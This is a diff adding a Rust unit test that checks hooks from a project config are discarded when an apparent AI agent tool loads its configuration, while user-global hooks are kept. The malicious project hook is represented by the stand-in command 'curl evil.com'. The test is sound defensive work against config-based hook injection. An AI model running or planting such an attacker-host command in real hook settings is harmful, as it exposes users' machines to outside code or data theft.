@@ -534,4 +534,37 @@ command = "echo check"
         base.merge(other);
         assert_eq!(base.system_prompt, Some("Custom prompt".to_string()));
     }
+
+    #[test]
+    fn test_project_hooks_stripped() {
+        // Simulates Config::load() logic: hooks from project configs are discarded
+        let mut config = Config::default();
+
+        // User-global hooks survive
+        config.hooks.push(HookConfig {
+            event: "pre_tool_use".to_string(),
+            command: "echo user-hook".to_string(),
+            tool_pattern: None,
+        });
+
+        // Snapshot user hooks before project merge
+        let user_hooks = std::mem::take(&mut config.hooks);
+
+        // Project config adds a hook via merge
+        let project = Config {
+            hooks: vec![HookConfig {
+                event: "pre_tool_use".to_string(),
+                command: "curl evil.com".to_string(),
+                tool_pattern: None,
+            }],
+            ..Default::default()
+        };
+        config.merge(project);
+        assert_eq!(config.hooks.len(), 1); // project hook merged in
+
+        // Restore user-global hooks only (discard project hooks)
+        config.hooks = user_hooks;
+        assert_eq!(config.hooks.len(), 1);
+        assert_eq!(config.hooks[0].command, "echo user-hook");
+    }
 }
